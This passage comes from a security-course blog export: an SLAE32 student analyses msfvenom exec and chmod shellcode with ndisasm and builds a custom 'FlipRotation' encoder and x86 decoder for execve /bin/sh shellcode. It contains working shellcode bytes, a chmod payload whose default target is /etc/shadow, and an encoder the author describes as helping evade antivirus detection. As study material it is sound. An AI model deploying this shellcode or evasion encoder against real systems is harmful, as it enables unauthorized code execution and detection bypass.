\u0026#34;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\u0026#34; \u0026#34;\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x07\\x00\\x00\u0026#34; \u0026#34;\\x00\\x77\\x68\\x6f\\x61\\x6d\\x69\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026#34;; Using ndisasm:\necho -ne \u0026#34;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x07\\x00\\x00\\x00\\x77\\x68\\x6f\\x61\\x6d\\x69\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026#34; | ndisasm -u - Output: 00000000 6A0B push byte +0xb 00000002 58 pop eax 00000003 99 cdq 00000004 52 push edx 00000005 66682D63 push word 0x632d 00000009 89E7 mov edi,esp 0000000B 682F736800 push dword 0x68732f 00000010 682F62696E push dword 0x6e69622f 00000015 89E3 mov ebx,esp 00000017 52 push edx 00000018 E807000000 call 0x24 0000001D 7768 ja 0x87 0000001F 6F outsd 00000020 61 popa 00000021 6D insd 00000022 6900575389E1 imul eax,[eax],dword 0xe1895357 00000028 CD80 int 0x80 Using awk to filter the output just for the assembly instructions:\necho -ne \u0026#34;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x07\\x00\\x00\\x00\\x77\\x68\\x6f\\x61\\x6d\\x69\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026#34; | ndisasm -u - | awk \u0026#39;{ print $3,$4,$5 }\u0026#39; --------------------------------------- push byte +0xb\t; push execve syscall number to stack pop eax ; puts 0xb in eax. A trick to put a value into a register without using the mov instruction cdq ; Zeroes edx. Already used this is the first assigments push edx ; push null to the stack push word 0x632d\t; pushing the string for \u0026#39;-c\u0026#39; onto the stack which will be used along with \u0026#39;/bin/sh\u0026#39; to specify \u0026#39;whoami\u0026#39; command mov edi,esp ; store a stack pointer in edi to be used as an argument to execve push dword 0x68732f push dword 0x6e69622f\t; pushing \u0026#39;/bin/sh\u0026#39; onto the stack mov ebx,esp ; storing the stack pointer to ebx. To be used as an argument to execve as well push edx ; push null to the stack call 0x24 ; call here to the instruction at 0x20 which is \u0026#39;push edi\u0026#39; which we stored our stack pointer in ja 0x87 outsd popa insd imul eax,[eax],dword 0xe1895357 int 0x80 --------------------------------------------------- call 0x24 To understand better what this instruction is doing, I disassembled the shellcode in gdb. Looking at the calling address, it is calling to the \u0026lsquo;middle\u0026rsquo; of imul instruction which translates to push edi. By pushing edi we put in the stack what we\u0026rsquo;ve stored there previously.\nThe instructions ja 0x87, outsd, popa, insd and imul eax,[eax],dword 0xe1895357 hide a very clever way to put our command (whoami) onto the stack.\nChecking the ndisasm output:\n0000001D 7768 ja 0x87 0000001F 6F outsd 00000020 61 popa 00000021 6D insd 00000022 6900575389E1 imul eax,[eax],dword 0xe1895357 Can we relate this behaviour to how ROP (Return Oriented Programming) gadgets are found in a binary? :)\nIf we convert the bold hex bytes, we see whoami magically appear, followed by a null byte (00).\nFrom cyberchef:\nAnd how this string in pushed onto the stack?\nCalling conventions is the answer. The call instruction will push the following instruction address to the stack. Similar to the JMP-CALL-POP technique. That\u0026rsquo;s how our command is placed onto the stack.\nThe final result of the instruction call 0x24 is to push the address of whoami address first (calling convention), and then push edi to the stack.\nThis way, the stack is ordered correctly as follows:\n0x632d ; -c 0x77686f616d6900 ; whoam But that\u0026rsquo;s not all. We need to know what are the last two bytes (89E1) from 6900575389E1 imul eax,[eax],dword 0xe1895357 purpose.\nUsing this online disassembler those instructions are translated to:\nmov ecx, esp We move the address at the top of the stack ecx, the second argument for the exec syscall. The same way passes the command '/bin/sh -c whoami'to the stack.\nAfter this, all arguments are pushed onto the stack. Just left execute the syscall with the following:\nint 0x80 Shellcode 3 - linux/x86/chmod The last shellcode is linux/x86/chmod. Let\u0026rsquo;s check its arguments in msfvenom.\nmsfvenom -p linux/x86/chmod --list-options\n-[~]$ msfvenom -p linux/x86/chmod --list-options Options for payload/linux/x86/chmod: ========================= Name: Linux Chmod Module: payload/linux/x86/chmod Platform: Linux Arch: x86 Needs Admin: No Total size: 36 Rank: Normal Provided by: kris katterjohn \u0026lt;katterjohn@gmail.com\u0026gt; Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- FILE /etc/shadow yes Filename to chmod MODE 0666 yes File mode (octal) Description: Runs chmod on specified file with specified mode So this shellcode has two options we have to provide. The file that we want to alter, and the and the chmod mode we want to make it. I will create a file within ~/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis directory, and the chmod it to be executable.\n-r--r----- 1 edu edu 0 Nov 24 14:23 test.txt sudo msfvenom -p linux/x86/chmod FILE=/home/edu/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt MODE=0777 -f c Output:\n-[~]$ msfvenom -p linux/x86/chmod FILE=/home/edu/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt MODE=0777 -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 98 bytes Final size of c file: 437 bytes unsigned char buf[] = \u0026#34;\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x4a\\x00\\x00\\x00\\x2f\\x68\\x6f\\x6d\u0026#34; \u0026#34;\\x65\\x2f\\x65\\x64\\x75\\x2f\\x44\\x65\\x73\\x6b\\x74\\x6f\\x70\\x2f\u0026#34; \u0026#34;\\x73\\x6c\\x61\\x65\\x5f\\x78\\x38\\x36\\x2f\\x61\\x73\\x73\\x69\\x67\u0026#34; \u0026#34;\\x6e\\x6d\\x65\\x6e\\x74\\x73\\x2f\\x35\\x2d\\x4d\\x53\\x46\\x5f\\x53\u0026#34; \u0026#34;\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x73\\x5f\\x41\\x6e\\x61\\x6c\u0026#34; \u0026#34;\\x79\\x73\\x69\\x73\\x2f\\x74\\x65\\x73\\x74\\x2e\\x74\\x78\\x74\\x00\u0026#34; \u0026#34;\\x5b\\x68\\xff\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\u0026#34;; Using ndisasm:\necho -ne \u0026#34;\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x4a\\x00\\x00\\x00\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x65\\x64\\x75\\x2f\\x44\\x65\\x73\\x6b\\x74\\x6f\\x70\\x2f\\x73\\x6c\\x61\\x65\\x5f\\x78\\x38\\x36\\x2f\\x61\\x73\\x73\\x69\\x67\\x6e\\x6d\\x65\\x6e\\x74\\x73\\x2f\\x35\\x2d\\x4d\\x53\\x46\\x5f\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x73\\x5f\\x41\\x6e\\x61\\x6c\\x79\\x73\\x69\\x73\\x2f\\x74\\x65\\x73\\x74\\x2e\\x74\\x78\\x74\\x00\\x5b\\x68\\xff\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\u0026#34; | ndisasm -u - 00000000 99 cdq 00000001 6A0F push byte +0xf 00000003 58 pop eax 00000004 52 push edx 00000005 E84A000000 call 0x54 0000000A 2F das 0000000B 686F6D652F push dword 0x2f656d6f 00000010 6564752F fs jnz 0x43 00000014 44 inc esp 00000015 65736B gs jnc 0x83 00000018 746F jz 0x89 0000001A 702F jo 0x4b 0000001C 736C jnc 0x8a 0000001E 61 popa 0000001F 655F gs pop edi 00000021 7838 js 0x5b 00000023 362F ss das 00000025 61 popa 00000026 7373 jnc 0x9b 00000028 69676E6D656E74 imul esp,[edi+0x6e],dword 0x746e656d 0000002F 732F jnc 0x60 00000031 352D4D5346 xor eax,0x46534d2d 00000036 5F pop edi 00000037 53 push ebx 00000038 68656C6C63 push dword 0x636c6c65 0000003D 6F outsd 0000003E 6465735F gs jnc 0xa1 00000042 41 inc ecx 00000043 6E outsb 00000044 61 popa 00000045 6C insb 00000046 7973 jns 0xbb 00000048 69732F74657374 imul esi,[ebx+0x2f],dword 0x74736574 0000004F 2E7478 cs jz 0xca 00000052 7400 jz 0x54 00000054 5B pop ebx 00000055 68FF010000 push dword 0x1ff 0000005A 59 pop ecx 0000005B CD80 int 0x80 0000005D 6A01 push byte +0x1 0000005F 58 pop eax 00000060 CD80 int 0x80 Filtering just by the assembly instruction with awk.\nThe output is:\necho -ne \u0026#34;\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x4a\\x00\\x00\\x00\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x65\\x64\\x75\\x2f\\x44\\x65\\x73\\x6b\\x74\\x6f\\x70\\x2f\\x73\\x6c\\x61\\x65\\x5f\\x78\\x38\\x36\\x2f\\x61\\x73\\x73\\x69\\x67\\x6e\\x6d\\x65\\x6e\\x74\\x73\\x2f\\x35\\x2d\\x4d\\x53\\x46\\x5f\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x73\\x5f\\x41\\x6e\\x61\\x6c\\x79\\x73\\x69\\x73\\x2f\\x74\\x65\\x73\\x74\\x2e\\x74\\x78\\x74\\x00\\x5b\\x68\\xff\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\u0026#34; | ndisasm -u - | awk \u0026#39;{print $3,$4,$5}\u0026#39; cdq ; zeroes edx push byte +0xf\t; push 0xf --\u0026gt; chmod syscall number pop eax ; put 0xf in eax push edx ; push a null onto the stack call 0x54 ; pushes next instruction address (\u0026#34;push dword 0x2f656d6f\u0026#34;) and jumps execution to the instruction placed 0x54 bytes relative to the start of the shellcode \u0026#34;; start of the test.txt path bytes\u0026#34; das push dword 0x2f656d6f fs jnz 0x43 inc esp gs jnc 0x83 jz 0x89 jo 0x4b jnc 0x8a popa gs pop edi js 0x5b ss das popa jnc 0x9b imul esp,[edi+0x6e],dword 0x746e656d jnc 0x60 xor eax,0x46534d2d pop edi push ebx push dword 0x636c6c65 outsd gs jnc 0xa1 inc ecx outsb popa insb jns 0xbb imul esi,[ebx+0x2f],dword 0x74736574 cs jz 0xca jz 0x54 \u0026#34;end of test.txt string bytes\u0026#34; \u0026#34;; start of decode stub\u0026#34; pop ebx push dword 0x1ff pop ecx int 0x80 push byte +0x1 pop eax int 0x80 These instructions\u0026rsquo; purpose is not to be \u0026ldquo;real\u0026rdquo; instructions or obfuscated code. It\u0026rsquo;s simply /home/eduardo/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt string bytes placed in memory represent the correspondent assembly instructions.\nMoving to 0x54 bytes from the beginning, we jump to the instruction pop ebx. This is where the decoding stub is placed.\nYou can check the first ndisasm output and see\n00000054 5B pop ebx From there, file path bytes are decoded and chmod is executed.\npop ebx ; execution is redirected to here. Store stack pointers of /home/eduardo/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt in ebx (1st arg) push dword 0x1ff\t; pushes the permissions or MODE parameter to be changed in the file pointed by ebx. 0x1ff (hex) = 777 (octal) pop ecx ; stores 0x1ff in ecx which is the 2chmod\u0026#39;s 2nd arg int 0x80 ; calls chmod push byte +0x1\t; pushes onto the stack the exit syscalll number pop eax ; stores x01 in eax int 0x80\t; calls exit Lessons learned The best trick I saw was to place string bytes as assembly instructions and then decode them in runtime. Is similar to the encoder lesson from the course, but the methodology is applied differently.\nThis is an example of thinking outside the box and how we can be creative if we put some effort into that.\nApart from that, the shellcodes had many null bytes, but the actual outcome after doing the complete analysis of the shellcodes in this blog post. My curiosity talked louder, and I tried generating these payloads using null bytes as bad chars.\nTo my surprise, I noticed some of the null bytes were introduced by local jumps using the call instruction with jmp-call-pop technique. This technique was replaced by the fnstenv method, which was mentioned in one of the challenges during the course.\nThis way, we can store the address of the next instruction in the FPU stack and avoid introducing null bytes with the call instruction.\nThe most important one: this assignment reminded me how we could learn from reading not just shellcode but any code from other languages written by others.\nWe can apply this lesson to other tasks in other areas (hardware, cooking, communication, etc.).\nBy doing that, we can learn new techniques and ways to think when we face a problem and be more efficient in any task.\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nNow at: https://www.pentesteracademy.com/course?id=3 Student ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae32/slae_32_assignment_5/","summary":"This post introduces the 5th mission of my SLAE32 journey.\nAn excellent task to see how a widely used tool by the offensive security community produces shellcode and compare it with my developed ones. New tricks and new cool learned.\nIntroduction The SLAE32 5th assignment purpose is to select 3 msfvenom payloads and document my own analysis of them.\nFor this task I selected the following payloads:\nlinux/x86/shell_reverse_tcp linux/x86/exec linux/x86/chmod Shellcode 1 - linux/x86/shell_reverse_tcp I chose this one to compare the msfvenom shellcode to the code of my first assignment.","title":"SLAE32 Assignment 5 - Msfvenom Shellcode Analysis"},{"content":" This post introduces the forth mission of my SLAE32 journey.\nA real handful and a challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode\nIntroduction The fourth assignment goal was to create my custom encoder and decoder of the execve stack shellcode. As you may know, the purpose is to execute /bin/sh.\nA shellcode encoder can be used for different purposes, mainly making it harder to detect by AV engines or simply avoiding bad characters (such as null bytes).\nFlipRotation Algorithm Overview The inspiration for this algorithm was the known CBC bit-flipping attack but applying a simple variation to our context.\nMore specifically, the steps are\nWe pick each shellcode byte and flip the last bit using a xor operation - flipped_shellbyte = shellbyte ^ 0x01 Based on that output the rotation direction is defined. We rotate right if odd or left if even. The number of rotation positions is defined by the loop index value (number of iterations) of the loop at that time. If we rotate right, we append 0x2 afther the encoded byte, and if we rotate left we append 0xff Put the byte 0xa0 as the shellcode end marker The following diagram can help to understand this process better.\nRegarding decoding, it is just simply reverting the steps, and we have our original shellcode back.\nFrom my experience, developing the decoder in assembly was much more straightforward than implementing the encoder logic in Python.\nEncoder The FlipRotation encoder was developed in Python language. The Encoder class supports various encoding modes, but we will focus only on the insertion mode.\nFlipRotation Encoder #!/usr/bin/python3 # # The FlipRotation Shellcode encoder # # Rotates back and flips the lowest bit of each byte. # import argparse import secrets import logging import sys secretsGenerator = secrets.SystemRandom() c_style_shellcode = (b\u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34;) # bin/sh def banner(): print(\u0026#39;\u0026#39;\u0026#39; _______________________________________________________________ \u0026lt;The \u0026#34;FlipRotation\u0026#34; Encoder - Bit flip and rotate your shellcode --------------------------------------------------------------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\\\ ||----w | || || \u0026#39;\u0026#39;\u0026#39;) #---------------------------- def bin2hex(binstr): return hex(int(binstr,2)) class Encoder: def randomKeyGenerator(self): byte = \u0026#39;0x\u0026#39; for i in range(2): hexDigits = [0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f] nibble = secretsGenerator.choice(hexDigits) # it gets in decimal not hex format byte = byte + hex(nibble)[2:] # hex class is str type. Appending to 0x return int(byte,16) # convert key to bytes and return def __init__(self,enc_type, key=None): if enc_type != \u0026#34;not\u0026#34;: if key is not None: self.key = key print(\u0026#34;[*] Key Provided by the user. Doing magic with it\u0026#34;) else: self.key = self.randomKeyGenerator() print(\u0026#34;[*] Doing magic with a (pseudo) Random key\u0026#34;) print(\u0026#34;[*] Key: \u0026#34;+hex(self.key)) # Function to left # rotate n by d bits def leftRotate(self,shellbits, d): tmp = shellbits[d:] + shellbits[0:d] return tmp # Function to right # rotate n by d bits def rightRotate(self, shellbits, d): return self.leftRotate(shellbits, len(shellbits) - d) def insertion_encode(self, shellcode): encoded = \u0026#39;\u0026#39; # 0x format encoded2 = \u0026#39;\u0026#39; # \\x format rotation_direction = \u0026#39;\u0026#39; rotation_counter = 0 for shellbyte in shellcode: flipped_shellbyte = shellbyte ^ 0x01 # flip lowest bit if bin(flipped_shellbyte)[-1] == \u0026#39;0\u0026#39;: logging.info(\u0026#34;Flipped byte - odd - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.rightRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits rotation_direction = \u0026#39;0x02\u0026#39; else: logging.info(\u0026#34;Flipped byte - even - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits print(\u0026#34;After rotation: \u0026#34;+ bin2hex(self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter%8))) rotation_direction = \u0026#39;0xff\u0026#39; final_shellbyte = bin2hex(rotated_shellbyte) rotation_counter += 1 encoded += final_shellbyte + \u0026#39;,\u0026#39; + rotation_direction +\u0026#39;,\u0026#39; # \\x format encoded2 += \u0026#39;\\\\x\u0026#39; + final_shellbyte[2:] + \u0026#39;\\\\x\u0026#39; + rotation_direction[2:] # \\x format print(\u0026#34;\\n[*] \\\\x format: \u0026#34;) encoded2 += \u0026#39;\\\\x\u0026#39; + hex(self.key)[2:] # add marker print(encoded2) print(\u0026#34;\\n[*] 0x format: \u0026#34;) encoded += \u0026#39;0x\u0026#39; + hex(self.key)[2:] + \u0026#39;,\u0026#39; + \u0026#39;0x\u0026#39; + hex(self.key)[2:] #add marker print(encoded) def main(): shellcode = bytearray(c_style_shellcode) print(\u0026#34;[*] Shellcode length: \u0026#34;+str(len(shellcode))+\u0026#34;\\n\u0026#34;) print(\u0026#34;[*] Shellcode: \u0026#34;+str(c_style_shellcode)+\u0026#34;\\n\u0026#34;) # -------------------KEY-------------- key = 0xa0 # can\u0026#39;t be 0x02 or 0xff. used for rotation direction ##################################### # -------------Encode Type----------- enc_type = \u0026#34;insertion\u0026#34; ##################################### if enc_type == \u0026#34;not\u0026#34;: encoder = Encoder(enc_type) encoder.complement_encoding(shellcode) elif enc_type == \u0026#34;xor\u0026#34;: encoder = Encoder(enc_type, key) encoder.xor_encoding_backslashX(shellcode)# utf-8 encoding (\\x4b,\\xe4,...) encoder.xor_encoding_0x(shellcode) # hex format (0x4b, 0xe4,...) elif enc_type == \u0026#34;insertion\u0026#34;: encoder = Encoder(enc_type, key) # providing a key with insertion encoding type encoder.insertion_encode(shellcode) # call insertion code with target shellcode as argument else: print(\u0026#34;[*] Encode type not supported. Please check the supported algorithms in the help menu\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: banner() # displays the program banner main() print(\u0026#34;\\n--------------------\u0026#34;) print(\u0026#34;[*] Hack the World!\u0026#34;) print(\u0026#34;--------------------\u0026#34;) print() print() The Encoder class can generate a pseudorandom key or use one provided by the user.\ndef randomKeyGenerator(self): byte = \u0026#39;0x\u0026#39; for i in range(2): hexDigits = [0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f] nibble = secretsGenerator.choice(hexDigits) # it gets in decimal not hex format #print(\u0026#34;nibble----\u0026#34;+hex(nibble)[2:]) byte = byte + hex(nibble)[2:] # hex class is str type. Appending to 0x #print(byte) #chr(int(byte,16)) # converts from base 16 to integer (decimal) and then to ascii (chr func) #print(int(byte,16)) return int(byte,16) # convert key to bytes and return def __init__(self,enc_type, key=None): if enc_type != \u0026#34;not\u0026#34;: if key is not None: self.key = key print(\u0026#34;[*] Key Provided by the user. Doing magic with it\u0026#34;) else: self.key = self.randomKeyGenerator() print(\u0026#34;[*] Doing magic with a (pseudo) Random key\u0026#34;) print(\u0026#34;[*] Key: \u0026#34;+hex(self.key)) Then, we can call the function insertion_encode and provide the target shellcode as an argument.\nencoder = Encoder(enc_type, key) # providing a key with insertion encoding type encoder.insertion_encode(shellcode) # call insertion code with target shellcode as argument The insertion_encode function is defined as follows:\ndef insertion_encode(self, shellcode): encoded = \u0026#39;\u0026#39; # 0x format encoded2 = \u0026#39;\u0026#39; # \\x format rotation_direction = \u0026#39;\u0026#39; rotation_counter = 0 for shellbyte in shellcode: flipped_shellbyte = shellbyte ^ 0x01 # flip lowest bit if bin(flipped_shellbyte)[-1] == \u0026#39;0\u0026#39;: logging.info(\u0026#34;Flipped byte - odd - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.rightRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits rotation_direction = \u0026#39;0x02\u0026#39; else: logging.info(\u0026#34;Flipped byte - even - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits print(\u0026#34;After rotation: \u0026#34;+ bin2hex(self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter%8))) rotation_direction = \u0026#39;0xff\u0026#39; final_shellbyte = bin2hex(rotated_shellbyte) rotation_counter += 1 encoded += final_shellbyte + \u0026#39;,\u0026#39; + rotation_direction +\u0026#39;,\u0026#39; # \\x format encoded2 += \u0026#39;\\\\x\u0026#39; + final_shellbyte[2:] + \u0026#39;\\\\x\u0026#39; + rotation_direction[2:] # \\x format print(\u0026#34;\\n[*] \\\\x format: \u0026#34;) encoded2 += \u0026#39;\\\\x\u0026#39; + hex(self.key)[2:] # add marker print(encoded2) print(\u0026#34;\\n[*] 0x format: \u0026#34;) encoded += \u0026#39;0x\u0026#39; + hex(self.key)[2:] + \u0026#39;,\u0026#39; + \u0026#39;0x\u0026#39; + hex(self.key)[2:] #add marker print(encoded) We started by iterating each shellcode byte and flipping the least significant bit - flipped_shellbyte\nThe rotation_counter is used as a reference for the number of rotated bits. After that, check that same bit for parity. If it is 1 is odd, but if it is 0 is even. An odd number will rotate right,, and an even number will rotate left. Before proceeding to the rotation, we convert the byte to binary for a more robust rotation.\nAlso, as each byte has 8 bits in size, the rotation is performed according to a circular shift methodology using the modulus % operator. Using the remainder, we stick to rotating only to a maximum of 7 bits each time.\nAfter performing the rotation and converting the binary number to hexadecimal, the encoding is completed - final_shellbyte. We can append it to the variables where the shellcode is being stored encoded and encoded2 followed by the rotation_direction (0x02 or 0xfff).\nif bin(flipped_shellbyte)[-1] == \u0026#39;0\u0026#39;: logging.info(\u0026#34;Flipped byte - odd - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.rightRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits rotation_direction = \u0026#39;0x02\u0026#39; else: logging.info(\u0026#34;Flipped byte - even - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits print(\u0026#34;After rotation: \u0026#34;+ bin2hex(self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter%8))) rotation_direction = \u0026#39;0xff\u0026#39; final_shellbyte = bin2hex(rotated_shellbyte) rotation_counter += 1 encoded += final_shellbyte + \u0026#39;,\u0026#39; + rotation_direction +\u0026#39;,\u0026#39; # \\x format encoded2 += \u0026#39;\\\\x\u0026#39; + final_shellbyte[2:] + \u0026#39;\\\\x\u0026#39; + rotation_direction[2:] # \\x format We add the end marker for each shellcode format in the last part.\nprint(\u0026#34;\\n[*] \\\\x format: \u0026#34;) encoded2 += \u0026#39;\\\\x\u0026#39; + hex(self.key)[2:] # add marker print(encoded2) print(\u0026#34;\\n[*] 0x format: \u0026#34;) encoded += \u0026#39;0x\u0026#39; + hex(self.key)[2:] + \u0026#39;,\u0026#39; + \u0026#39;0x\u0026#39; + hex(self.key)[2:] #add marker print(encoded) Encoder Output ╭─edu@debian ~/Desktop/slae_x86/assignments/4-Custom_Encoder_Decoder ‹main●› ╰─$ python3 flipRotation_Encoder.py _______________________________________________________________ \u0026lt;The \u0026#34;FlipRotation\u0026#34; Encoder - Bit flip and rotate your shellcode --------------------------------------------------------------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || [*] Shellcode length: 25 [*] Shellcode: b\u0026#39;1\\xc0Ph//shh/bin\\x89\\xe3P\\x89\\xe2S\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#39; [*] Key Provided by the user. Doing magic with it [*] Key: 0xa0 After rotation: 0x83 After rotation: 0x45 After rotation: 0x4b After rotation: 0xb4 After rotation: 0x69 After rotation: 0x8d After rotation: 0xf6 After rotation: 0xa8 After rotation: 0xc7 After rotation: 0x36 After rotation: 0x81 [*] \\x format: \\x30\\x02\\x83\\xff\\x45\\xff\\x4b\\xff\\xe2\\x02\\x71\\x02\\xc9\\x02\\xb4\\xff\\x69\\xff\\x17\\x02\\x8d\\xff\\xd\\x02\\xf6\\xff\\x44\\x02\\x8b\\x02\\xa8\\xff\\x88\\x02\\xc7\\xff\\x94\\x02\\x11\\x02\\xe\\x02\\x36\\xff\\x28\\x02\\x99\\x02\\x81\\xff\\xa0 [*] 0x format: 0x30,0x02,0x83,0xff,0x45,0xff,0x4b,0xff,0xe2,0x02,0x71,0x02,0xc9,0x02,0xb4,0xff,0x69,0xff,0x17,0x02,0x8d,0xff,0xd,0x02,0xf6,0xff,0x44,0x02,0x8b,0x02,0xa8,0xff,0x88,0x02,0xc7,0xff,0x94,0x02,0x11,0x02,0xe,0x02,0x36,0xff,0x28,0x02,0x99,0x02,0x81,0xff,0xa0,0xa0 -------------------- [*] Hack the World! -------------------- We have the encoded shellcode already with rotation direction for each byte and the end marker.\nDecoder I said before that it was more straightforward than the encoder, but it was not easy. I needed to use a piece of paper and a pencil to develop the logic to decode the payload in assembly.\nLet’s dig into the assembly.\n; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 4 : Custom Encoder/Decoder Shellcode (Linux/x86) Assembly - FlipRotation Encoder ; File Name : flipRotation_decoder.nasm global _start section .text _start: jmp short call_decoder decoder: pop esi lea edi, [esi+1]\t; pointing to second byte (0x02) from shellcode xor eax, eax ; keep track parity byte cdq\t; zeroes edx. mov al,\t1 xor ecx, ecx xor ebx, ebx decode: mov bl, byte [esi + eax]\t; mov parity byte to bl xor bl, 0xa0\t; check if reached the end marker | 0xa0 ^ 0xff = 0x5f jz short EncodedShellcode\t; reached the marker if Zero Flag not set xor bl, 0x5f\t; if equal, parity is even (0xff) mov bl, byte [esi + edx] jnz odd even:\t; rotate right ror bl, cl jmp short bitFlip odd: ; rotate left rol bl, cl bitFlip: xor bl, 0x01 restore_next_byte: mov byte [esi + edx], bl\t; replaces the original byte mov bl, byte [esi + eax + 1] ; mov next shellbyte mov byte [edi], bl inc edi add al, 2 inc dl inc cl ; = 0x2b F - 00101011 ; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 bits (al register). cmp cl, 0x08\t; if equal ZF will be set meaning we have a complete rotation jnz decode\t; $+2 ; jump if rotation is not complete xor ecx, ecx\t; if rotation is complete reset, cl to start again the \u0026#34;circular array\u0026#34; jmp short decode call_decoder: call decoder EncodedShellcode: db 0x30,0x02,0x83,0xff,0x45,0xff,0x4b,0xff,0xe2,0x02,0x71,0x02,0xc9,0x02,0xb4,0xff,0x69,0xff,0x17,0x02,0x8d,0xff,0xd,0x02,0xf6,0xff,0x44,0x02,0x8b,0x02,0xa8,0xff,0x88,0x02,0xc7,0xff,0x94,0x02,0x11,0x02,0xe,0x02,0x36,0xff,0x28,0x02,0x99,0x02,0x81,0xff,0xa0,0xa0 ; 0xa0 is the stop marker Divide and Conquer the FlipRotation Decoder This decoder uses the jmp-call-pop technique to push the address of the encoded shellcode on the stack and redirect control flow to the decoder branch. Then, the address is stored in esi\nWe use eax to track each parity byte and edx to control the offset from the beginning of the shellcode.\ndecoder: pop esi lea edi, [esi+1]\t; pointing to second byte (0x02) from shellcode xor eax, eax ; keep track parity byte cdq\t; zeroes edx. mov al,\t1 ; first parity byte xor ecx, ecx ; loop index and number of rotation bits xor ebx, ebx After this, we have our decoder branch, which has the logic to decode the encoded shellcode. It starts by moving the parity byte and checking with xor bl, 0xa0 if it matches the end marker. If yes, it the shellcode is decoded and redirects the execution flow to its first instruction.\nThe result of this xor operation using the parity byte will be used below with the operation xor bl, 0x5f to verify if the associated shellcode byte is odd or even.\nWe know because if we have an even shellcode byte, its parity is 0xff and results in 0xa0 ^ 0xff = 0x5f, which si stored in bl. Then doing xor bl, 0x5f will set ZF (zero flag) to 1. We know if the shellcode byte is even or odd based on the zero flag value.\ndecode: mov bl, byte [esi + eax]\t; mov parity byte to bl xor bl, 0xa0\t; check if reached the end marker | 0xa0 ^ 0xff = 0x5f jz short EncodedShellcode\t; reached the marker if Zero Flag not set xor bl, 0x5f\t; if equal, parity is even (0xff) and sets ZF mov bl, byte [esi + edx] jnz odd The next couple of instructions are straightforward. We rotate in the opposite way that was performed by the encoder according to the byte parity and bit, flipping the least significant bit.\neven:\t; rotate right ror bl, cl jmp short bitFlip odd: ; rotate left rol bl, cl bitFlip: xor bl, 0x01 At this stage, the trick is already done. We do replace the encoded shellcode byte 